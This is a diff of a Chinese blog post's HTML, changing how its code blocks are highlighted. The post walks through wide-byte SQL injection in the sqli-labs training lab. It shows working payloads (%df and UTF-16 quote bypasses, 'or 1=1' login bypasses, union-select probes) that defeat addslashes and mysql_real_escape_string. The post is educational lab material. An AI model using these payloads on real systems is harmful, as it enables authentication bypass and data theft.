@@ -474,7 +474,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    825
+                    874
                 </div>
                 
 
@@ -491,6 +491,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -505,20 +508,20 @@
 <p>源码中将<code>&#39;</code>，<code>&quot;</code>和<code>\</code>进行了过滤`。</p>
 <p>将 <code>&#39;</code> 转为<code>\&#39;</code>， 将 <code>\</code> 转为<code>\\</code>，将 <code>&quot;</code>转为 <code>\&quot;</code>，将<code>\&#39;</code>转为<code>\\\&#39;</code>。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210155309048.png" alt="image-20220210155309048"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-32/?id=1\&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1\&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以看到<code>\&#39;</code>过滤掉了。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210155816313.png" alt="image-20220210155816313"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-32/?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>当使用<code>%df</code>将<code>\</code>吃掉后成功注入。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210160354619.png" alt="image-20220210160354619"></p>
 <p>判断字段数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-32/?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210160633736.png" alt="image-20220210160633736"></p>
 <p>判断回显点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-32/?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210160746728.png" alt="image-20220210160746728"></p>
 <h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p><strong>Less-33</strong></p>
@@ -530,29 +533,32 @@
 <h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><strong>Less-34</strong></p>
 <p>由于Less-34是POST方式提交信息，而上面几关是GET方式通过url形式提交，数据会通过URLencode；</p>
 <p><strong>POST注入中可以利用</strong>：将 utf-8 转换为 utf-16 或 utf-32，例如将<code>&#39;</code>转为 utf-16 为 <code>�&#39;</code>进行注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&#x27; or 1=1 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;�&#39; or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210163426756.png" alt="image-20220210163426756"></p>
 <p>判断字段数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&#x27; order by 3 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;�&#39; order by 3 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210163753118.png" alt="image-20220210163753118"></p>
 <p>判断回显点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&#x27; union select 1,2 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;�&#39; union select 1,2 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210163726016.png" alt="image-20220210163726016"></p>
 <p>原sql语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27;</span><br><span class="line">and password=&#x27;$passwd&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token variable">@$sql</span><span class="token operator">=</span>"<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'$uname'</span>
+<span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>此时 sql 语句为:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;�&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27; and password=&#x27;</span>$passwd<span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'�'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#' and password='$passwd' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
 <h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p><strong>Less35</strong></p>
 <p>源码中<code>id</code>值没有被处理，忽略<code>addslashes()</code>函数。<br><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210164117234.png" alt="image-20220210164117234"></p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-35/?id=-1 or 1=1</span><br><span class="line">http://sqli-labs-master/Less-35/?id=1 order by 4</span><br><span class="line">http://sqli-labs-master/Less-35/?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;-1 or 1&#x3D;1
+http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;1 order by 4
+http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -562,11 +568,11 @@
 <p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
 <p>下列字符受影响： <code>\x00</code>，  <code>\n</code>，  <code>\r</code>，  <code>\</code>，  <code>&#39;</code>，<code>&quot;</code>， <code>\x1a</code></p>
 <p>判断注入点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-36/?id=1%df&#x27;  or 1=1--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-36&#x2F;?id&#x3D;1%df&#39;  or 1&#x3D;1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里还是使用<code>%df</code>吃掉<code>\</code>。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210165309366.png" alt="image-20220210165309366"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-36/?id=�&#x27;  or 1=1--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-36&#x2F;?id&#x3D;�&#39;  or 1&#x3D;1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>或者这里直接使用<code>�&#39;</code>Bypass。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210165421459.png" alt="image-20220210165421459"></p>
@@ -576,7 +582,7 @@
 <p>源码当中还是使用了<code>mysql_real_escape_string()</code>函数，原理相同。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210165847294.png" alt="image-20220210165847294"></p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin�&#x27; or 1=1#&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin�&#39; or 1&#x3D;1#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210170033498.png" alt="image-20220210170033498"></p>
 <h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p> 从上面的几关当中，可以总结一下过滤 ‘ \ 常用的三种方式是直接 <code>replace</code>， <code>addslashes()</code>,<code>mysql_real_escape_string()</code>。三种方式仅仅依靠一个函数是不能完全防御的，所 以我们在编写代码的时候需要考虑的更加仔细。</p>
@@ -780,12 +786,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-                        <span class="chip bg-color">基础知识</span>
-                    </a>
-                    
                     <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
                         <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                        <span class="chip bg-color">基础知识</span>
                     </a>
                     
                 </div>
@@ -1017,7 +1023,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.4k</span>
+                        class="white-color">32.1k</span>
             
             
             
